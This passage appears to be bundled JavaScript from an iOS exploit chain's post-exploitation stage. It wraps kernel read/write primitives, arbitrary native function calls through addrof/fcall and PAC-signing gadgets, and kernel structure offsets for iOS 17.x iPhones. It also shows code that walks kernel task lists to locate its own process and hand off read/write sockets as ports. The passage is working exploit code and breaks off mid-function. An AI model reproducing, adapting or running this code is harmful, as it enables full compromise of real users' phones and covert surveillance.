function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }

var TAG = "CHAIN";
var Chain = /*#__PURE__*/function () {
  function Chain() {
    _classCallCheck(this, Chain);
  }
  return _createClass(Chain, null, [{
    key: "init",
    value: function init(driver) {
      var mutex = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : null;
      _driver._ = _assertClassBrand(Chain, this, driver);
      _mutex._ = _assertClassBrand(Chain, this, mutex);
    }
  }, {
    key: "destroy",
    value: function destroy() {
      _assertClassBrand(Chain, this, _driver)._.destroy();
    }
  }, {
    key: "runPE",
    value: function runPE() {
      return _assertClassBrand(Chain, this, _driver)._.runPE();
    }
  }, {
    key: "getKernelBase",
    value: function getKernelBase() {
      return _assertClassBrand(Chain, this, _driver)._.getKernelBase();
    }
  }, {
    key: "getSelfTaskAddr",
    value: function getSelfTaskAddr() {
      return _assertClassBrand(Chain, this, _driver)._.getSelfTaskAddr();
    }
  }, {
    key: "read",
    value: function read(srcAddr, dst, len) {
      _assertClassBrand(Chain, this, _mutexLock).call(this);
      var ret = _assertClassBrand(Chain, this, _driver)._.read(srcAddr, dst, len);
      _assertClassBrand(Chain, this, _mutexUnlock).call(this);
      return ret;
    }
  }, {
    key: "write",
    value: function write(dst, src, len) {
      _assertClassBrand(Chain, this, _mutexLock).call(this);
      var ret = _assertClassBrand(Chain, this, _driver)._.write(dst, src, len);
      _assertClassBrand(Chain, this, _mutexUnlock).call(this);
      return ret;
    }
  }, {
    key: "readBuff",
    value: function readBuff(srcAddr, len) {
      if (!this.read(srcAddr, Native.mem, len)) return false;
      return Native.read(Native.mem, len);
    }
  }, {
    key: "read8",
    value: function read8(src) {
      this.read(src, Native.mem, 1);
      return Native.read8(Native.mem);
    }
  }, {
    key: "read16",
    value: function read16(src) {
      this.read(src, Native.mem, 2);
      return Native.read16(Native.mem);
    }
  }, {
    key: "read32",
    value: function read32(src) {
      this.read(src, Native.mem, 4);
      return Native.read32(Native.mem);
    }
  }, {
    key: "read64",
    value: function read64(src) {
      this.read(src, Native.mem, 8);
      return Native.read64(Native.mem);
    }
  }, {
    key: "write8",
    value: function write8(dst, value) {
      Native.write8(Native.mem, value);
      this.write(dst, Native.mem, 1);
    }
  }, {
    key: "write16",
    value: function write16(dst, value) {
      Native.write16(Native.mem, value);
      this.write(dst, Native.mem, 2);
    }
  }, {
    key: "write32",
    value: function write32(dst, value) {
      Native.write32(Native.mem, value);
      this.write(dst, Native.mem, 4);
    }
  }, {
    key: "write64",
    value: function write64(dst, value) {
      Native.write64(Native.mem, value);
      this.write(dst, Native.mem, 8);
    }
  }, {
    key: "offsets",
    value: function offsets() {
      return _assertClassBrand(Chain, this, _driver)._.offsets();
    }
  }, {
    key: "strip",
    value: function strip(val) {
      return _assertClassBrand(Chain, this, _driver)._.strip(val);
    }
  }, {
    key: "writeZoneElement",
    value: function writeZoneElement(dstAddr, src, len) {
      return _assertClassBrand(Chain, this, _driver)._.writeZoneElement(dstAddr, src, len);
    }
  }, {
    key: "getPaciaGadget",
    value: function getPaciaGadget() {
      return _assertClassBrand(Chain, this, _driver)._.getPaciaGadget();
    }
  }, {
    key: "getClearPaciaGadget",
    value: function getClearPaciaGadget() {
      return _assertClassBrand(Chain, this, _driver)._.getClearPaciaGadget();
    }
  }, {
    key: "transferRW",
    value: function transferRW() {
      var rwCtx = _assertClassBrand(Chain, this, _driver)._.transferRW();
      var controlSocket = rwCtx.controlSocket;
      var rwSocket = rwCtx.rwSocket;
      console.log(TAG, "controlSocket: " + controlSocket);
      console.log(TAG, "rwSocket: " + rwSocket);
      var portPtr = Native.mem;
      Native.callSymbol("fileport_makeport", controlSocket, portPtr);
      var controlPort = Native.read32(portPtr);
      Native.callSymbol("fileport_makeport", rwSocket, portPtr);
      var rwPort = Native.read32(portPtr);
      return {
        controlPort: controlPort,
        rwPort: rwPort,
        controlSocket: controlSocket,
        rwSocket: rwSocket
      };
    }
  }, {
    key: "threadSpawn",
    value: function threadSpawn(scriptCFString, threadMem) {
      _assertClassBrand(Chain, this, _driver)._.threadSpawn(scriptCFString, threadMem);
    }
  }, {
    key: "testKRW",
    value: function testKRW() {
      console.log(TAG, "Testing KRW");
      console.log(TAG, "- kernelBase: " + _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getKernelBase()));
      console.log(TAG, "- PACIA gadget: " + _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getPaciaGadget()));
      console.log(TAG, "- Read kernel magic (4 bytes)");
      var buff = this.readBuff(this.getKernelBase(), 4);
      if (!buff) {
        console.log(TAG, "kernel RW not working!");
        return false;
      }
      var buff32 = new Uint32Array(buff);
      console.log(TAG, "- Magic: ".concat(_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(buff32[0])));
      if (buff32[0] != 0xfeedfacf) {
        console.log(TAG, "Invalid magic!");
        return false;
      }
      return true;
    }
  }]);
}();
_Chain = Chain;
function _mutexLock() {
  if (_assertClassBrand(_Chain, this, _mutex)._) Native.callSymbol("pthread_mutex_lock", _assertClassBrand(_Chain, this, _mutex)._);
}
function _mutexUnlock() {
  if (_assertClassBrand(_Chain, this, _mutex)._) Native.callSymbol("pthread_mutex_unlock", _assertClassBrand(_Chain, this, _mutex)._);
}
var _driver = {
  _: void 0
};
var _mutex = {
  _: void 0
};


/***/ }),

/***/ "./libs/Chain/Native.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Native; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
var _Native;
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
var Native = /*#__PURE__*/function () {
  function Native() {
    _classCallCheck(this, Native);
  }
  return _createClass(Native, null, [{
    key: "write",
    value: function write(ptr, buff) {
      var buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);
      this.callSymbol("memcpy", ptr, buffPtr, buff.byteLength);
    }
  }, {
    key: "write32",
    value: function write32(ptr, value) {
      var buffWrite = new ArrayBuffer(4);
      var view = new DataView(buffWrite);
      view.setUint32(0, value, true);
      this.write(ptr, buffWrite);
    }
  }, {
    key: "read",
    value: function read(ptr, length) {
      var buffRes = new ArrayBuffer(length);
      var buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);
      this.callSymbol("memcpy", buffPtr, ptr, length);
      return buffRes;
    }
  }, {
    key: "read8",
    value: function read8(ptr) {
      var buff = this.read(ptr, 1);
      var view = new DataView(buff);
      return view.getUint8(0);
    }
  }, {
    key: "read16",
    value: function read16(ptr) {
      var buff = this.read(ptr, 2);
      var view = new DataView(buff);
      return view.getUint16(0, true);
    }
  }, {
    key: "read32",
    value: function read32(ptr) {
      var buff = this.read(ptr, 4);
      var view = new DataView(buff);
      return view.getUint32(0, true);
    }
  }, {
    key: "read64",
    value: function read64(ptr) {
      var buff = this.read(ptr, 8);
      var view = new DataView(buff);
      return view.getBigUint64(0, true);
    }
  }, {
    key: "readPtr",
    value: function readPtr(ptr) {
      return this.read64(ptr);
    }
  }, {
    key: "readString",
    value: function readString(ptr) {
      var len = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 1024;
      var buff = this.read(ptr, len);
      return this.bytesToString(buff, false);
    }
  }, {
    key: "write8",
    value: function write8(ptr, value) {
      var buffWrite = new ArrayBuffer(1);
      var view = new DataView(buffWrite);
      view.setUint8(0, value);
      this.write(ptr, buffWrite);
    }
  }, {
    key: "write16",
    value: function write16(ptr, value) {
      var buffWrite = new ArrayBuffer(2);
      var view = new DataView(buffWrite);
      view.setUint16(0, value, true);
      this.write(ptr, buffWrite);
    }
  }, {
    key: "write64",
    value: function write64(ptr, value) {
      var buffWrite = new ArrayBuffer(8);
      var view = new DataView(buffWrite);
      view.setBigUint64(0, value, true);
      this.write(ptr, buffWrite);
    }
  }, {
    key: "writeString",
    value: function writeString(ptr, str) {
      //const buff = this.stringToBytes(str, true);
      //this.write(ptr, buff);
      this.callSymbol("memcpy", ptr, str, str.length + 1);
    }
  }, {
    key: "getCString",
    value: function getCString(str) {
      return get_cstring(str);
    }
  }, {
    key: "strip",
    value: function strip(address) {
      return address & 0x7fffffffffn;
    }
  }, {
    key: "pacia",
    value: function (_pacia) {
      function pacia(_x, _x2) {
        return _pacia.apply(this, arguments);
      }
      pacia.toString = function () {
        return _pacia.toString();
      };
      return pacia;
    }(function (address, modifier) {
      address = Native.strip(address);
      //console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
      var signedAddress = pacia(address, BigInt(modifier));
      //console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
      return signedAddress;
    })
  }, {
    key: "dlsym",
    value: function dlsym(name) {
      return Native.callSymbol("dlsym", RTLD_DEFAULT, name);
    }
  }, {
    key: "callSymbol",
    value: function callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
      var funcSymbol = null;
      if (name === "dlysm") funcSymbol = DLSYM;else funcSymbol = fcall(DLSYM, RTLD_DEFAULT, get_cstring(name));
      a0 = _assertClassBrand(Native, this, _prepareArg).call(this, a0);
      a1 = _assertClassBrand(Native, this, _prepareArg).call(this, a1);
      a2 = _assertClassBrand(Native, this, _prepareArg).call(this, a2);
      a3 = _assertClassBrand(Native, this, _prepareArg).call(this, a3);
      a4 = _assertClassBrand(Native, this, _prepareArg).call(this, a4);
      a5 = _assertClassBrand(Native, this, _prepareArg).call(this, a5);
      a6 = _assertClassBrand(Native, this, _prepareArg).call(this, a6);
      a7 = _assertClassBrand(Native, this, _prepareArg).call(this, a7);
      a8 = _assertClassBrand(Native, this, _prepareArg).call(this, a8);
      a9 = _assertClassBrand(Native, this, _prepareArg).call(this, a9);
      a10 = _assertClassBrand(Native, this, _prepareArg).call(this, a10);
      a11 = _assertClassBrand(Native, this, _prepareArg).call(this, a11);
      a12 = _assertClassBrand(Native, this, _prepareArg).call(this, a12);
      a13 = _assertClassBrand(Native, this, _prepareArg).call(this, a13);
      a14 = _assertClassBrand(Native, this, _prepareArg).call(this, a14);
      a15 = _assertClassBrand(Native, this, _prepareArg).call(this, a15);
      var chosen_fcall = null;
      if (typeof fcall_with_pacia !== 'undefined') chosen_fcall = fcall_with_pacia;else chosen_fcall = fcall;
      var ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);
      if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
      if (ret64 == 0xffffffffffffffffn) return -1;
      return ret64;
    }
  }, {
    key: "callSymbolRetain",
    value: function callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
      return Native.callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);
    }
  }, {
    key: "bytesToString",
    value: function bytesToString(bytes) {
      var includeNullChar = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : true;
      var bytes8 = new Uint8Array(bytes);
      var str = "";
      for (var i = 0; i < bytes8.length; i++) {
        if (!includeNullChar && !bytes8[i]) break;
        str += String.fromCharCode(bytes8[i]);
      }
      return str;
    }
  }, {
    key: "stringToBytes",
    value: function stringToBytes(str) {
      var nullTerminated = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
      var buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
      var s8 = new Uint8Array(buff);
      for (var i = 0; i < str.length; i++) s8[i] = str.charCodeAt(i);
      if (nullTerminated) s8[str.length] = 0x0;
      return s8.buffer;
    }
  }, {
    key: "gc",
    value: function gc() {}
  }]);
}(); // Register global Native class
_Native = Native;
function _prepareArg(arg) {
  if (!arg) arg = 0n;
  if (typeof arg === "string") return get_cstring(arg);
  return BigInt(arg);
}
function _doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {
  // Initialize argPtr to point to general purpose memory chunk
  _argPtr._ = _assertClassBrand(_Native, this, _assertClassBrand(_Native, this, _argMem)._);
  x0 = _assertClassBrand(_Native, this, _toNative).call(this, x0);
  x1 = _assertClassBrand(_Native, this, _toNative).call(this, x1);
  x2 = _assertClassBrand(_Native, this, _toNative).call(this, x2);
  x3 = _assertClassBrand(_Native, this, _toNative).call(this, x3);
  x4 = _assertClassBrand(_Native, this, _toNative).call(this, x4);
  x5 = _assertClassBrand(_Native, this, _toNative).call(this, x5);
  x6 = _assertClassBrand(_Native, this, _toNative).call(this, x6);
  x7 = _assertClassBrand(_Native, this, _toNative).call(this, x7);
  var ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);
  // Reset argPtr
  _argPtr._ = _assertClassBrand(_Native, this, _assertClassBrand(_Native, this, _argMem)._);
  return _assertClassBrand(_Native, this, _fromNative).call(this, ret);
}
function _fromNative(value) {
  if (!(value instanceof ArrayBuffer)) return value;
  var view = new DataView(value);
  return view.getBigInt64(0, true);
}
function _toNative(value) {
  // Strings need to be manually written to native memory
  if (typeof value === 'string') {
    var ptr = _assertClassBrand(_Native, this, _argPtr)._;
    this.writeString(ptr, value);
    _argPtr._ = _assertClassBrand(_Native, this, _assertClassBrand(_Native, this, _argPtr)._ + BigInt(value.length + 1));
    return _assertClassBrand(_Native, this, _bigIntToArray).call(this, ptr);
  } else if (typeof value === 'bigint') {
    return _assertClassBrand(_Native, this, _bigIntToArray).call(this, value);
  } else return value;
}
function _bigIntToArray(value) {
  var a = new Uint8Array(8);
  for (var i = 0; i < 8; i++) {
    a[i] = Number(value & 0xffn);
    value >>= 8n;
  }
  return a.buffer;
}
// Preallocated memory chunk for general purpose stuff for public use
_defineProperty(Native, "mem", 0n);
_defineProperty(Native, "memSize", 0x4000);
// Preallocated memory chunk for encoding/decoding of string arguments
var _argMem = {
  _: 0n
};
// Pointer to next available memory for native argument
var _argPtr = {
  _: 0n
};
(function () {
  _Native.mem = _Native.callSymbol("malloc", _Native.memSize);
  _argMem._ = _assertClassBrand(_Native, _Native, _Native.callSymbol("malloc", 0x1000n));
  _argPtr._ = _assertClassBrand(_Native, _Native, _assertClassBrand(_Native, _Native, _argMem)._);
})();

globalThis.Native = Native;

/***/ }),

/***/ "./libs/Chain/OffsetsStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return OffsetsStruct; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
var OFFSET_KERNEL_BASE = 0xfffffff007004000n;
//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max
//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max
var OFFSET_KERNEL_TASK = 0x0n;
var OFFSET_TASK_MAP = 0x28n;
var OFFSET_TASK_NEXT = 0x30n;
var OFFSET_TASK_PREV = 0x38n;
var OFFSET_TASK_THREADS = 0x58n;
var OFFSET_TASK_IPC_SPACE = 0x300n;
var OFFSET_TASK_PROC_RO = 0x3a0n;
var OFFSET_TASK_PROC_SIZE = 0x740n; // iOS 17.5.1
var OFFSET_TASK_EXC_GUARD = 0x5d4n;
var OFFSET_IPC_SPACE_TABLE = 0x20n;
var OFFSET_IPC_ENTRY_OBJECT = 0x0n;
var OFFSET_IPC_OBJECT_KOBJECT = 0x48n;
var OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n;
var OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n;
var OFFSET_PROC_PID = 0x60n;
var OFFSET_PROC_P_COMM = 0x568n;
var OFFSET_THREAD_OPTIONS = 0x70n;
var OFFSET_THREAD_KSTACKPTR = 0xf0n;
var OFFSET_THREAD_ROP_PID = 0x160n;
var OFFSET_THREAD_JOP_PID = 0x168n;
var OFFSET_THREAD_GUARD_EXC_CODE = 0x330n;
var OFFSET_THREAD_TASK_THREADS = 0x370n;
var OFFSET_THREAD_TRO = 0x380n;
var OFFSET_THREAD_AST = 0x3a4n;
var OFFSET_THREAD_MUTEX_DATA = 0x3b0n;
var OFFSET_THREAD_CTID = 0x430n;
var OFFSET_TRO_TASK = 0x20n;
var OFFSET_VM_HDR_RBH_ROOT = 0x38n;
var OFFSET_VM_RBE_LEFT = 0x0n;
var OFFSET_VM_RBE_RIGHT = 0x8n;
var OFFSET_VM_OBJECT_VOU_SIZE = 0x18n;
var OFFSET_VM_OBJECT_REF_COUNT = 0x28n;
var OFFSET_VM_NAMED_ENTRY_COPY = 0x10n;
var OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n;
var OFFSET_MIG_LOCK = 0x0n;
var OFFSET_MIG_SBXMSG = 0x0n;
var OffsetsStruct = /*#__PURE__*/_createClass(function OffsetsStruct() {
  _classCallCheck(this, OffsetsStruct);
  this.baseKernel = OFFSET_KERNEL_BASE;
  this.kernelTask = OFFSET_KERNEL_TASK;
  this.T1SZ_BOOT = 17n;
  this.mapTask = OFFSET_TASK_MAP;
  this.nextTask = OFFSET_TASK_NEXT;
  this.prevTask = OFFSET_TASK_PREV;
  this.threads = OFFSET_TASK_THREADS;
  this.ipcSpace = OFFSET_TASK_IPC_SPACE;
  this.procRO = OFFSET_TASK_PROC_RO;
  this.procSize = OFFSET_TASK_PROC_SIZE;
  this.excGuard = OFFSET_TASK_EXC_GUARD;
  this.spaceTable = OFFSET_IPC_SPACE_TABLE;
  this.entryObject = OFFSET_IPC_ENTRY_OBJECT;
  this.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;
  this.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;
  this.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;
  this.pid = OFFSET_PROC_PID;
  this.pComm = OFFSET_PROC_P_COMM;
  this.options = OFFSET_THREAD_OPTIONS;
  this.kstackptr = OFFSET_THREAD_KSTACKPTR;
  this.ropPid = OFFSET_THREAD_ROP_PID;
  this.jopPid = OFFSET_THREAD_JOP_PID;
  this.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;
  this.taskThreads = OFFSET_THREAD_TASK_THREADS;
  this.tro = OFFSET_THREAD_TRO;
  this.ast = OFFSET_THREAD_AST;
  this.mutexData = OFFSET_THREAD_MUTEX_DATA;
  this.ctid = OFFSET_THREAD_CTID;
  this.troTask = OFFSET_TRO_TASK;
  this.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;
  this.rbeLeft = OFFSET_VM_RBE_LEFT;
  this.rbeRight = OFFSET_VM_RBE_RIGHT;
  this.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;
  this.refCount = OFFSET_VM_OBJECT_REF_COUNT;
  this.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;
  this.next = OFFSET_VM_NAMED_ENTRY_NEXT;
  this.migLock = OFFSET_MIG_LOCK;
  this.migSbxMsg = OFFSET_MIG_SBXMSG;
});


/***/ }),

/***/ "./libs/Driver/Driver.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return DriverPostExpl; });
/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Driver/Offsets.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/JSUtils/Utils.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateMethodInitSpec(e, a) { _checkPrivateRedeclaration(e, a), a.add(e); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }



var TAG = "DRIVER-POSTEXPL";
var _offsets = /*#__PURE__*/new WeakMap();
var _kernelBase = /*#__PURE__*/new WeakMap();
var _DriverPostExpl_brand = /*#__PURE__*/new WeakSet();
var DriverPostExpl = /*#__PURE__*/function () {
  function DriverPostExpl() {
    _classCallCheck(this, DriverPostExpl);
    _classPrivateMethodInitSpec(this, _DriverPostExpl_brand);
    _classPrivateFieldInitSpec(this, _offsets, void 0);
    _classPrivateFieldInitSpec(this, _kernelBase, void 0);
    _classPrivateFieldSet(_offsets, this, _Offsets__WEBPACK_IMPORTED_MODULE_0__["default"].getByDeviceAndVersion());
  }
  return _createClass(DriverPostExpl, [{
    key: "runPE",
    value: function runPE() {
      console.log(TAG, "runPE()");
      if (!_classPrivateFieldGet(_offsets, this)) {
        console.log(TAG, "Offsets were not obtained, aborting");
        return false;
      }
      /*
      let baseKernel = startSandworm();
      if (baseKernel == -1)
      	return false;
      */
      _classPrivateFieldSet(_kernelBase, this, mpd_kernel_base());
      return true;
    }
  }, {
    key: "getPaciaGadget",
    value: function getPaciaGadget() {
      return mpd_pacia_gadget();
    }
  }, {
    key: "getKernelBase",
    value: function getKernelBase() {
      return _classPrivateFieldGet(_kernelBase, this);
    }
  }, {
    key: "getSelfTaskAddr",
    value: function getSelfTaskAddr() {
      console.log(TAG, "getSelfTaskAddr");
      var selfTaskKaddr = 0;
      for (var i = 0; i < 5; i++) {
        selfTaskKaddr = _assertClassBrand(_DriverPostExpl_brand, this, _findSelfTaskKaddr).call(this, true);
        if (!selfTaskKaddr) {
          console.log(TAG, "Searching the other way around");
          selfTaskKaddr = _assertClassBrand(_DriverPostExpl_brand, this, _findSelfTaskKaddr).call(this, false);
        } else break;
        libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 20000);
      }
      return selfTaskKaddr;
    }
  }, {
    key: "read",
    value: function read(srcAddr, dst, len) {
      srcAddr = this.strip(srcAddr);
      if (srcAddr < 0xffffffd000000000n) {
        console.log(TAG, "Invalid kaddr, cannot read: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(srcAddr)));
        return false;
      }
      kread_length(srcAddr, dst, len);
      return true;
    }
  }, {
    key: "write",
    value: function write(dst, src, len) {
      var dstAddr = this.strip(dst);
      if (dstAddr < 0xffffffd000000000n) {
        console.log(TAG, "Invalid kaddr, cannot write:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(dstAddr)));
        return false;
      }
      kwrite_length(dst, src, len);
      return true;
    }
  }, {
    key: "writeZoneElement",
    value: function writeZoneElement(dstAddr, src, len) {
      return kwrite_zone_element(dstAddr, src, len);
    }
  }, {
    key: "offsets",
    value: function offsets() {
      return _classPrivateFieldGet(_offsets, this);
    }
  }, {
    key: "strip",
    value: function strip(val) {
      return xpac(val);
    }
  }, {
    key: "transferRW",
    value: function transferRW() {
      return {
        controlSocket: mpd_control_socket(),
        rwSocket: mpd_rw_socket()
      };
    }
  }, {
    key: "threadSpawn",
    value: function threadSpawn(scriptCFString, threadMem) {
      mpd_js_thread_spawn(scriptCFString, threadMem, true);
    }
  }]);
}();
function _findSelfTaskKaddr(direction) {
  var kernelTaskAddr = _classPrivateFieldGet(_kernelBase, this) + _classPrivateFieldGet(_offsets, this).kernelTask;
  console.log(TAG, "baseKernel: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(_classPrivateFieldGet(_kernelBase, this)), ", kernelTask: ").concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(kernelTaskAddr)));
  var kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
  kernelTaskVal = uread64(kernelTaskVal);
  //console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
  kernelTaskVal = BigInt(kernelTaskVal);
  //console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
  var ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
  console.log(TAG, "Our pid:".concat(ourPid));
  var nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
  if (direction) this.read(kernelTaskVal + _classPrivateFieldGet(_offsets, this).nextTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);else this.read(kernelTaskVal + _classPrivateFieldGet(_offsets, this).prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
  nextTask = uread64(nextTask);
  //console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

  while (nextTask != 0 && nextTask != kernelTaskVal) {
    var procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    this.read(nextTask + _classPrivateFieldGet(_offsets, this).procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
    procROAddr = uread64(procROAddr);
    //console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
    var procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    this.read(procROAddr, procVal, 8);
    procVal = BigInt(uread64(procVal));
    //console.log(TAG,`procVal:${Utils.hex(procVal)}`);
